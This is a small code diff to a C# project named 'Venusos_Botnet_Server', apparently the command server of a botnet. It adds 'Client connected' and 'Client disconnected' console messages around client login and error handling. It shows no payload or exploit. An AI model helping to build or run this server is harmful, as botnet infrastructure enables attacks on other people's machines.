@@ -45,6 +45,7 @@ namespace Venusos_Botnet_Server
                             Console.WriteLine(data);
                             if (data is "test")
                             {
+                                Console.WriteLine("Client connected");
                                 logged = true;
                                 just_logged = true;
                             }
@@ -107,6 +108,10 @@ namespace Venusos_Botnet_Server
                             }
                         }
                     }
+                }
+                catch
+                {
+                    Console.WriteLine("Client disconnected");
                 }
                 finally
                 {
